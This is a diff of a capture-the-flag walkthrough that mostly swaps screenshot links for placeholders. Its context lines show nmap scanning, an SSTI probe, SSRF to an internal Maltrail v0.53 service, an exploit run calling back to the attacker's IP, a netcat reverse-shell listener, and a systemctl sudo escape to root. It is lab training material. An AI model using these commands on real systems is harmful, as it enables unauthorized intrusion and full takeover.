@@ -16,11 +16,11 @@ sudo nmap -p- --min-rate 5000 -sT -vvv $target
 sudo nmap -sC -sV -p 22,55555 -T4 $target
 ```
 
-![Nmap Scan](https://github.com/user-attachments/assets/65abc825-ac10-4971-8d1c-8f20cb47bc63)
+![Nmap Scan](https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur)
 
-![Service Scan](https://github.com/user-attachments/assets/8bc1cd58-ec14-4ef0-b8f7-d938846ad1ad)
+![Service Scan](https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur)
 
-![Detailed Scan Results](https://github.com/user-attachments/assets/d5c2d7ee-12d4-4281-ae25-a4d49ebd864e)
+![Detailed Scan Results](https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur)
 
 **Findings:**
 - **Port 22**: SSH service
@@ -49,44 +49,44 @@ curl http://$target:55555/zntrtvt -A "{{hello world}}'\""
 
 Web application interface after clicking "Create":
 
-![Create Basket](https://github.com/user-attachments/assets/6ea0a02e-45c3-4923-9490-867c20648cd6)
+![Create Basket](https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur)
 
 After clicking "Open Basket" on the webpage:
 
-![Open Basket](https://github.com/user-attachments/assets/1fe5c45f-6be9-448d-9aa7-2690fbb66236)
+![Open Basket](https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur)
 
 Resulting URL: `http://10.129.17.179:55555/zntrtvt`
 
-![Basket Interface](https://github.com/user-attachments/assets/bf98b2f6-d504-47e1-95aa-524ec7fd102d)
+![Basket Interface](https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur)
 
 Initial curl request with no custom User-Agent:
 ```bash
 curl http://10.129.17.179:55555/zntrtvt
 ```
-![Basic Curl](https://github.com/user-attachments/assets/978b5668-db6b-4958-bc3d-d74086617ff0)
+![Basic Curl](https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur)
 
 Curl with custom User-Agent revealing headers:
 ```bash
 curl http://10.129.17.179:55555/zntrtvt -A "hello world"
 ```
-![User-Agent Test](https://github.com/user-attachments/assets/2054cda9-a6a9-40f2-850e-d43831f6845e)
+![User-Agent Test](https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur)
 
-![User-Agent Headers](https://github.com/user-attachments/assets/64660a77-e680-4730-862b-fe616d68d150)
+![User-Agent Headers](https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur)
 
 SSTI injection attempt:
 ```bash
 curl http://10.129.17.179:55555/zntrtvt -A "{{hello world}}'\""
 ```
-![SSTI Test](https://github.com/user-attachments/assets/4326f5a0-5be8-4521-aab0-d639b2c39c70)
+![SSTI Test](https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur)
 
 ### Proxy Configuration Discovery
 Settings menu revealing Forward URL functionality:
 
-![Settings Menu](https://github.com/user-attachments/assets/85e03282-5048-4eaa-b596-788d941310c4)
+![Settings Menu](https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur)
 
 Testing with attacker's IP as forward URL:
 
-![Forward URL Setup](https://github.com/user-attachments/assets/7f6cd370-6d15-4847-95aa-74fcca948d47)
+![Forward URL Setup](https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur)
 
 Traffic capture showing request forwarding:
 ```bash
@@ -104,7 +104,7 @@ Accept-Encoding: gzip
 
 Testing with localhost as forward URL:
 
-![Localhost Forward](https://github.com/user-attachments/assets/ab1b1953-4d74-49b2-9c68-c3d70416a259)
+![Localhost Forward](https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur)
 
 Full webpage response revealing Maltrail v0.53:
 ```html
@@ -135,7 +135,7 @@ Full webpage response revealing Maltrail v0.53:
 </html>
 ```
 
-![Maltrail Interface](https://github.com/user-attachments/assets/0ec8a2b7-97ec-4c1f-b8fa-04eacbf27106)
+![Maltrail Interface](https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur)
 
 ## Vulnerability Discovery
 
@@ -159,9 +159,9 @@ python3 exploit.py 10.10.14.172 9001 http://$target:55555
 nc -nlvp 9001
 ```
 
-![Automated Exploit](https://github.com/user-attachments/assets/2830f684-02c1-485e-bd44-60c5af5b6f17)
+![Automated Exploit](https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur)
 
-![Reverse Shell Obtained](https://github.com/user-attachments/assets/e68ebe70-01b1-4c55-b635-a09e511f20ac)
+![Reverse Shell Obtained](https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur)
 
 ### Method 2: Manual Exploitation
 ```bash
@@ -185,7 +185,7 @@ e635420e2f09e2907e721b7e1f131afa
 sudo -l
 ```
 
-![Sudo Privileges](https://github.com/user-attachments/assets/ea286154-333d-4cce-8090-da5da65224c5)
+![Sudo Privileges](https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur)
 
 **Findings:**
 User `puma` can execute the following command as root without password:
@@ -196,7 +196,7 @@ sudo /usr/bin/systemctl status trail.service
 ### Exploiting Sudo Privileges
 Using GTFOBins methodology for systemctl privilege escalation:
 
-![GTFOBins Reference](https://github.com/user-attachments/assets/03163c16-3f3d-4e93-9332-7dae9d830696)
+![GTFOBins Reference](https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur)
 
 ```bash
 # Execute systemctl with sudo
@@ -206,9 +206,9 @@ sudo /usr/bin/systemctl status trail.service
 !sh
 ```
 
-![Privilege Escalation Process](https://github.com/user-attachments/assets/00dc1d82-c0c5-4164-87bf-1f4f854aaf29)
+![Privilege Escalation Process](https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur)
 
-![Root Shell Obtained](https://github.com/user-attachments/assets/9dfca0f6-d6cd-4bf4-8ec0-b7da23b553c9)
+![Root Shell Obtained](https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur)
 
 **Root Access Achieved:**
 ```bash
